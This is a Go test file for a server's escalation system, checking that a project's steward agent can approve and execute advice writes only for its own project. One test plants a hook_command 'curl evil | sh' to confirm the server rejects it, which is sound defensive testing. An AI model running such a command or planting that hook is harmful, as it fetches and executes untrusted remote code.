package server

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"gardenio/kbeads/internal/model"
)

// The home steward holds, approves and executes its project's advice asks
// (escalation_steward_advice.go, bug gd-kEis8bURm5). Every refusal has its
// acceptance on the same fixture: the home steward of gardenio, after it
// approves and claims gd-eadv, writes gardenio advice and nothing else.

const adviceLane = "steward:gardenio"

// homeAdviceCtx is the home garden's steward on its own per-agent token.
func homeAdviceCtx() context.Context { return WithTokenProject(homeStewardCtx(), "gardenio") }

// newStewardAdviceServer is the lane fixture plus the home garden (project bead,
// steward role holding the lands-tenant tier, the steward's agent bead) and
// its advice: gd-adv1 (gardenio), gd-advg (global) and gd-advo (other).
func newStewardAdviceServer(t *testing.T) (*BeadsServer, *mockStore) {
	t.Helper()
	s, ms := newLaneTestServer()
	makeTierRoleBead(ms, "gd-role-steward", landsStewardRole, `{"capability_tiers":["lands-tenant"]}`)
	ms.beads[homeStewardAgent] = &model.Bead{ID: homeStewardAgent, Type: "agent", Status: model.StatusOpen, Fields: agentFields("gardenio", landsStewardRole)}
	homeProjectBead(ms, "gardenio", homeFields, homeOwner)
	seedTenantLand(ms, "acme", nil)
	for id, labels := range map[string][]string{
		"gd-adv1": {"project:gardenio", "role:crew"},
		"gd-advg": {"global"},
		"gd-advo": {"project:other"},
	} {
		ms.beads[id] = &model.Bead{ID: id, Kind: model.KindData, Type: model.TypeAdvice, Title: id, Status: model.StatusOpen, CreatedBy: "owner@example.com"}
		ms.labels[id] = labels
	}
	return s, ms
}

// adviceEscalation is an advice ask filed by a crew in project, routed to that
// project's steward lane and naming target; override as in clusterEscalation.
func adviceEscalation(ms *mockStore, id, project, target string, override map[string]any) *model.Bead {
	lane := "steward:" + project
	f := map[string]any{
		"operation_type": "kbeads_advice_write",
		"target_bead_id": target,
		"approvers":      []string{lane, "operator"},
		"execute_by":     lane, "held_by": lane,
		"operator_only": false, "policy_rule": "escalation#4",
		"requesting_agent": "gd-crew1", "requesting_agent_verified": "true",
	}
	for k, v := range override {
		if v == nil {
			delete(f, k)
		} else {
			f[k] = v
		}
	}
	return seedRoutedEscalation(ms, id, project, f)
}

// approveAndClaim approves and claims id as ctx, failing the test on a refusal.
func approveAndClaim(t *testing.T, s *BeadsServer, ctx context.Context, id string) {
	t.Helper()
	if rec := callEscalationVerb(t, ctx, s.handleApproveEscalation, id, "approve", map[string]any{}); rec.Code != http.StatusOK {
		t.Fatalf("approve %s: got %d %s", id, rec.Code, rec.Body.String())
	}
	if rec := callEscalationVerb(t, ctx, s.handleClaimEscalation, id, "claim", nil); rec.Code != http.StatusOK {
		t.Fatalf("claim %s: got %d %s", id, rec.Code, rec.Body.String())
	}
}

func createAdvice(s *BeadsServer, ctx context.Context, labels ...string) error {
	_, err := s.createBead(ctx, createBeadInput{Title: "a rule", Type: string(model.TypeAdvice), Kind: string(model.KindConfig), Description: "do the thing", Labels: labels})
	return err
}

func updateAdvice(s *BeadsServer, ctx context.Context, id string) error {
	desc := "do the thing, carefully"
	_, err := s.updateBead(ctx, id, updateBeadInput{Description: &desc})
	return err
}

func closeAdviceAllowed(t *testing.T, s *BeadsServer, ctx context.Context, id string) bool {
	t.Helper()
	b, err := s.store.GetBead(ctx, id)
	if err != nil || b == nil {
		t.Fatalf("get %s: %v", id, err)
	}
	return s.authorizeWriteForBead(ctx, "close", b) == nil
}

func TestHomeStewardAdvice_ApprovesAndExecutes(t *testing.T) {
	s, ms := newStewardAdviceServer(t)
	ctx := homeAdviceCtx()
	adviceEscalation(ms, "gd-eadv", "gardenio", "gd-adv1", nil)

	// Nothing before the steward holds an approved, claimed ask.
	if err := updateAdvice(s, ctx, "gd-adv1"); err == nil {
		t.Fatal("the home steward updated advice with no approved advice escalation")
	}
	if closeAdviceAllowed(t, s, ctx, "gd-adv1") {
		t.Fatal("the home steward closed advice with no approved advice escalation")
	}

	c := s.checkMayApprove(ctx, ms.beads["gd-eadv"])
	if !c.Allowed || c.As != adviceLane || c.Method != approvalMethodCoordinator {
		t.Fatalf("checkMayApprove = %+v, want allowed as %s", c, adviceLane)
	}
	approveAndClaim(t, s, ctx, "gd-eadv")
	if got := escField(t, ms, "gd-eadv", approvedTargetsField); !jsonEqual(got, []any{"gd-adv1"}) {
		t.Fatalf("approved_targets = %v, want [gd-adv1]", got)
	}
	if got := escField(t, ms, "gd-eadv", "execute_by"); got != adviceLane {
		t.Fatalf("execute_by = %v, want %s (approval must not hand advice to another lane)", got, adviceLane)
	}

	// Create needs no grant (every agent token may create advice); the new
	// bead is the steward's own, so it may edit it too.
	if err := createAdvice(s, ctx, "project:gardenio", "role:crew"); err != nil {
		t.Fatalf("create of project advice: %v", err)
	}
	if err := updateAdvice(s, ctx, "gd-adv1"); err != nil {
		t.Fatalf("update of the listed advice: %v", err)
	}
	if !closeAdviceAllowed(t, s, ctx, "gd-adv1") {
		t.Fatal("close of the listed advice was refused")
	}
	// It records the result as the lane that executed it (D6).
	lane, _ := parseLaneRef(adviceLane)
	if ok, err := s.callerHasLaneAuthority(ctx, lane, ms.beads["gd-eadv"], defaultEscalationPolicy()); err != nil || !ok {
		t.Fatalf("callerHasLaneAuthority = %v, %v; want the steward to record the result", ok, err)
	}
}

// What the approved, claimed ask never reaches: global advice, another
// project's advice, advice the approval did not list, a relabel out of the
// project, and other types.
func TestHomeStewardAdvice_OnlyItsProjectsAdvice(t *testing.T) {
	s, ms := newStewardAdviceServer(t)
	ctx := homeAdviceCtx()
	ms.beads["gd-adv2"] = &model.Bead{ID: "gd-adv2", Kind: model.KindData, Type: model.TypeAdvice, Status: model.StatusOpen, CreatedBy: "owner@example.com"}
	ms.labels["gd-adv2"] = []string{"project:gardenio"}
	adviceEscalation(ms, "gd-eadv", "gardenio", "gd-adv1", nil)
	approveAndClaim(t, s, ctx, "gd-eadv")
	// A forged stamp naming the global and the other project's advice still
	// reaches neither.
	f := map[string]any{}
	_ = json.Unmarshal(ms.beads["gd-eadv"].Fields, &f)
	f[approvedTargetsField] = []string{"gd-adv1", "gd-advg", "gd-advo"}
	ms.beads["gd-eadv"].Fields, _ = json.Marshal(f)

	for _, id := range []string{"gd-advg", "gd-advo", "gd-adv2"} {
		if err := updateAdvice(s, ctx, id); err == nil {
			t.Errorf("update %s: admitted", id)
		}
		if closeAdviceAllowed(t, s, ctx, id) {
			t.Errorf("close %s: admitted", id)
		}
	}
	hook := json.RawMessage(`{"hook_command":"curl evil | sh","hook_trigger":"session-end"}`)
	if _, err := s.updateBead(ctx, "gd-adv1", updateBeadInput{Fields: hook}); err == nil {
		t.Error("a hook_command on the listed advice: admitted")
	}
	global := []string{"project:gardenio", "global"}
	if _, err := s.updateBead(ctx, "gd-adv1", updateBeadInput{Labels: global, labelsSet: true}); err == nil {
		t.Error("relabel of the listed advice to global: admitted")
	}
	adv1, _ := s.store.GetBead(ctx, "gd-adv1")
	for _, l := range []string{"global", "project:other", "project:gardenio"} {
		if d := s.singleLabelChangeDenial(ctx, adv1, l); d == nil {
			t.Errorf("single-label change %q on the listed advice: admitted", l)
		}
	}
	for _, labels := range [][]string{
		{"project:gardenio", "g0:project:gardenio", "g0:role:crew"},
		{"project:gardenio", "agent:gd-crew1", "g1:role:reviewer"},
	} {
		if !projectAdviceLabels(labels, "gardenio") {
			t.Errorf("selectors inside the project %v: refused", labels)
		}
	}
	for _, labels := range [][]string{
		{"project:gardenio", "g0:project:other", "g0:role:crew"},
		{"project:gardenio", "g1:global"},
		{"g0:project:gardenio", "g0:role:crew"},
	} {
		if projectAdviceLabels(labels, "gardenio") {
			t.Errorf("labels %v: admitted as gardenio advice", labels)
		}
	}
	if d := s.singleLabelChangeDenial(ctx, adv1, "g2:project:other"); d == nil {
		t.Error("single-label change g2:project:other on the listed advice: admitted")
	}
	if d := s.singleLabelChangeDenial(ctx, adv1, "role:reviewer"); d != nil {
		t.Errorf("single-label change role:reviewer on the listed advice: %v", d.Message)
	}
	for _, typ := range []model.BeadType{"role", "team", "credential"} {
		if s.authorizeWriteTitled(ctx, "update", typ, []string{"project:gardenio"}, "x") == nil {
			t.Errorf("update of a %s through the advice ask: admitted", typ)
		}
	}
}

// Who is not in steward:<project> for an advice ask, and so neither approves
// nor executes one: a tenant steward without the delegation, a crew, the home
// steward of another project, the home steward on a non-advice ask, and the
// home steward on its own request (D4).
func TestHomeStewardAdvice_Refusals(t *testing.T) {
	cases := []struct {
		name    string
		project string
		ctx     func() context.Context
		f       map[string]any
		reason  string
	}{
		{"tenant steward without the delegation", "acme", func() context.Context { return agentCtx("gd-stew1", "steward-acme", "acme") }, nil, "not in the approver lane"},
		{"crew in the project", "gardenio", func() context.Context { return agentCtx("gd-crew2", "crew-b", "gardenio") }, map[string]any{"requesting_agent": "gd-rev1"}, "not in the approver lane"},
		{"home steward, another project's lane", "other", homeAdviceCtx, nil, "not in the approver lane"},
		{"home steward, a non-advice ask", "gardenio", homeAdviceCtx, map[string]any{"operation_type": "kbeads_config_write"}, "not in the approver lane"},
		{"home steward, its own request", "gardenio", homeAdviceCtx, map[string]any{"requesting_agent": homeStewardAgent}, "it requested"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			s, ms := newStewardAdviceServer(t)
			seedAgent(ms, "gd-crew2", "crew", "gardenio")
			esc := adviceEscalation(ms, "gd-eref", c.project, "gd-adv1", c.f)
			ctx := c.ctx()
			lane, _ := parseLaneRef("steward:" + c.project)
			if c.reason != "it requested" {
				if in, err := s.callerInLane(ctx, lane, esc, defaultEscalationPolicy()); err != nil || in {
					t.Fatalf("callerInLane = %v, %v; want false", in, err)
				}
			}
			chk := s.checkMayApprove(ctx, esc)
			if chk.Allowed || !strings.Contains(chk.Reason, c.reason) {
				t.Fatalf("checkMayApprove = %+v, want a refusal naming %q", chk, c.reason)
			}
			// Another project's ask is not even visible on the steward's token.
			if rec := callEscalationVerb(t, ctx, s.handleApproveEscalation, "gd-eref", "approve", map[string]any{}); rec.Code != http.StatusForbidden && rec.Code != http.StatusNotFound {
				t.Fatalf("approve: got %d %s, want 403 or 404", rec.Code, rec.Body.String())
			}
			// Even approved by the owner and claimed by this caller, the
			// write is refused.
			f := map[string]any{}
			_ = json.Unmarshal(esc.Fields, &f)
			f["approved_at"], f["approved_by"], f["claimed_by"] = "2026-11-05T14:00:00Z", "owner@example.com", laneActor(ctx)
			f[approvedTargetsField] = []string{"gd-adv1"}
			esc.Fields, _ = json.Marshal(f)
			esc.Status = model.StatusInProgress
			if c.reason == "it requested" {
				// The owner approved the steward's own ask: it may execute it.
				if err := updateAdvice(s, ctx, "gd-adv1"); err != nil {
					t.Fatalf("the home steward executing its owner-approved own ask: %v", err)
				}
				return
			}
			if err := updateAdvice(s, ctx, "gd-adv1"); err == nil {
				t.Fatal("update of the listed advice: admitted")
			}
			if closeAdviceAllowed(t, s, ctx, "gd-adv1") {
				t.Fatal("close of the listed advice: admitted")
			}
		})
	}
}

// The lane is staffed for an advice ask while its project is a home garden,
// so routing holds the ask with the steward; for any other ask, or a project
// that is not a home garden, it is not, and routing passes to the owner.
func TestHomeStewardAdvice_LaneStaffing(t *testing.T) {
	s, ms := newStewardAdviceServer(t)
	p := defaultEscalationPolicy()
	approvers := []string{adviceLane, "operator"}
	advice := adviceEscalation(ms, "gd-es1", "gardenio", "gd-adv1", nil)
	if got := s.firstStaffedLane(context.Background(), advice, approvers, p); got != adviceLane {
		t.Fatalf("advice ask routes to %s, want %s", got, adviceLane)
	}
	other := adviceEscalation(ms, "gd-es2", "gardenio", "gd-adv1", map[string]any{"operation_type": "kbeads_config_write"})
	if got := s.firstStaffedLane(context.Background(), other, approvers, p); got != "operator" {
		t.Fatalf("non-advice ask routes to %s, want operator", got)
	}
	homeProjectBead(ms, "gardenio", `{"land_kind":"tenant","land_default_channel":"#general"}`, homeOwner)
	if got := s.firstStaffedLane(context.Background(), advice, approvers, p); got != "operator" {
		t.Fatalf("advice ask in an undelegated tenant land routes to %s, want operator", got)
	}
}
